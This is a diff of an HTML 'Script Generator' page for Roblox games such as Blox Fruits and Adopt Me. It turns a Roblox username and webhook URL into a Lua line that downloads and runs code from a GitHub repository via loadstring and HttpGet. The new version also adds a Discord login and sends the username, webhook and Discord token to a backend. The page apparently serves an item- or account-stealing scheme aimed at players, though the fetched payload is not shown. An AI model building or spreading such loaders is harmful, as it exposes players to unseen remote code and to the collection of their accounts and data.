@@ -5,265 +5,79 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Script Generator</title>
     <style>
-        body {
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 3rem;
-            animation: fadeIn 1.5s ease-in-out;
-            margin-bottom: 30px;
-        }
-        .container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 20px;
-        }
-        .game-button {
-            background: linear-gradient(45deg, #ff0080, #ff5c8d);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 1.2rem;
-            border-radius: 15px;
-            cursor: pointer;
-            transition: transform 0.3s, background 0.3s;
-            width: 220px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
-        }
-        .game-button:hover {
-            background: linear-gradient(45deg, #ff0055, #ff4d72);
-            transform: scale(1.1);
-            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.6);
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #1e1e2e;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-        }
-        .popup input {
-            display: block;
-            margin: 10px auto;
-            padding: 12px;
-            width: 80%;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            background: #2c2c2c;
-            color: white;
-            font-size: 1rem;
-        }
-        .popup button {
-            background: linear-gradient(45deg, #ff0080, #ff5c8d);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.2rem;
-            margin-top: 10px;
-        }
-        .popup button:hover {
-            background: linear-gradient(45deg, #ff0055, #ff4d72);
-        }
-        .script-output {
-            background: #222;
-            padding: 20px;
-            border-radius: 10px;
-            color: #00ff00;
-            font-family: monospace;
-            margin-top: 20px;
-            max-width: 90%;
-            margin: 0 auto;
-            display: none;
-            word-wrap: break-word;
-            white-space: pre-wrap;
-            position: relative;
-        }
-        .copy-button {
-            background: #00ff00;
-            color: black;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .copy-button:hover {
-            background: #00cc00;
-        }
-        .updating {
-            background: #f0ad4e;
-            color: black;
-            padding: 8px 16px;
-            border-radius: 5px;
-            font-weight: bold;
-            margin-top: 15px;
-        }
-        .dots {
-            font-size: 1.5rem;
-            display: inline-block;
-            animation: dot 1s infinite;
-        }
-        .dot {
-            display: inline-block;
-            opacity: 0;
-            animation: dotOpacity 1.5s infinite;
-        }
-        .dot:nth-child(1) {
-            animation-delay: 0s;
-        }
-        .dot:nth-child(2) {
-            animation-delay: 0.5s;
-        }
-        .dot:nth-child(3) {
-            animation-delay: 1s;
-        }
-        @keyframes dot {
-            0% { opacity: 0; }
-            50% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-        @keyframes dotOpacity {
-            0% { opacity: 0; }
-            33% { opacity: 1; }
-            66% { opacity: 0; }
-            100% { opacity: 0; }
-        }
+        body { background: linear-gradient(45deg, #0f0c29, #302b63, #24243e); color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff0055; transform: scale(1.1); }
+        .auth-container { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; }
+        .auth-box { background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 8px; backdrop-filter: blur(5px); }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
-    <div class="container">
-        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
-        <button class="game-button" onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
-        <button class="game-button" onclick="openPopup('Adopt Me')">Adopt Me</button>
-        <button class="game-button" onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
-        <button class="game-button" onclick="openPopup('Pls Donate')">Pls Donate</button>
+    <div id="auth-container" class="auth-container">
+        <div class="auth-box">
+            <h2>Login with Discord</h2>
+            <button id="auth-btn">Authenticate with Discord</button>
+        </div>
     </div>
-
-    <div id="popup" class="popup">
-        <h2 id="game-title">Enter Details for Game</h2>
-        <input type="text" id="username" placeholder="Enter Roblox Username">
-        <input type="text" id="webhook" placeholder="Enter Webhook URL">
+    
+    <div class="container">
+        <button onclick="openPopup('Blox Fruits')">Blox Fruits</button>
+        <button onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
+        <button onclick="openPopup('Adopt Me')">Adopt Me</button>
+    </div>
+    
+    <div id="popup" class="popup" style="display: none;">
+        <h2 id="game-title">Enter Details</h2>
+        <input type="text" id="username" placeholder="Roblox Username">
+        <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
         <button onclick="closePopup()">Close</button>
     </div>
 
-    <div id="scriptOutput" class="script-output">
-        <p id="scriptContent"></p>
-        <div id="copySection"></div>
-    </div>
-
     <script>
         let currentGame = '';
-        let lastGithubURL = '';
+        let authToken = ''; // Store authentication token for Discord
 
-        function openPopup(game) {
-            currentGame = game;
-            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
-            document.getElementById('popup').style.display = 'block';
-            document.getElementById('scriptOutput').style.display = 'none';
-            document.getElementById('username').value = '';
-            document.getElementById('webhook').value = '';
-            lastGithubURL = '';
-            document.getElementById('copySection').innerHTML = '';
-            document.getElementById('scriptContent').innerHTML = '';
+        // Show the auth modal
+        document.getElementById('auth-btn').onclick = function() {
+            window.location.href = 'https://your-backend-url.com/auth'; // Your backend to handle OAuth2
+        };
+
+        function openPopup(game) { 
+            if (!authToken) {
+                alert("Please authenticate first.");
+                return;
+            }
+            currentGame = game; 
+            document.getElementById('popup').style.display = 'block'; 
         }
 
-        function closePopup() {
-            document.getElementById('popup').style.display = 'none';
+        function closePopup() { 
+            document.getElementById('popup').style.display = 'none'; 
         }
 
         function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
             if (username && webhook) {
-                let script;
-                let githubURL = '';
-                
-                showGeneratingAnimation();
+                let url = currentGame === 'Blox Fruits' ? 'Bloxfruits' : (currentGame === 'Murder Mystery 2' ? 'Void' : 'AdoptMe');
+                let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/${url}'))()`;
+                alert(script);
 
-                if (currentGame === 'Blox Fruits') {
-                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits';
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
-                } else if (currentGame === 'Murder Mystery 2') {
-                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void';
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
-                } else if (currentGame === 'Adopt Me') {
-                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Adopt%20me';
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
-                } else if (currentGame === 'Pet Simulator 99') {
-                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Ps99';
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
-                } else if (currentGame === 'Pls Donate') {
-                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Pls%20Donate';
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
-                }
-
-                if (githubURL !== lastGithubURL) {
-                    lastGithubURL = githubURL;
-                    showUpdatingNotification();
-                }
-
-                setTimeout(function () {
-                    document.getElementById('scriptContent').textContent = script;
-                    showCopyButton(script);
-                }, 2000);
-            } else {
-                alert("Please enter both a username and webhook.");
-            }
-        }
-
-        function showGeneratingAnimation() {
-            let content = document.getElementById('scriptContent');
-            content.textContent = 'Generating script';
-            let dots = document.createElement('span');
-            dots.classList.add('dots');
-            dots.innerHTML = '<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';
-            content.appendChild(dots);
-            document.getElementById('scriptOutput').style.display = 'block';
-        }
-
-        function showCopyButton(script) {
-            let copyButton = document.createElement('button');
-            copyButton.textContent = 'Copy Script';
-            copyButton.classList.add('copy-button');
-            copyButton.onclick = function() {
-                navigator.clipboard.writeText(script).then(() => {
-                    alert('Script copied to clipboard!');
+                // Send data to backend to log the user and webhook
+                fetch('https://your-backend-url.com/log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        username: username, 
+                        webhook: webhook, 
+                        discordUser: authToken 
+                    })
                 });
-            };
-            document.getElementById('copySection').appendChild(copyButton);
-        }
-
-        function showUpdatingNotification() {
-            const notification = document.createElement('div');
-            notification.classList.add('updating');
-            notification.textContent = 'Updating script...';
-            document.body.appendChild(notification);
-
-            setTimeout(() => {
-                notification.remove();
-            }, 2000);
+            } else { alert("Please fill in both fields!"); }
         }
     </script>
 </body>
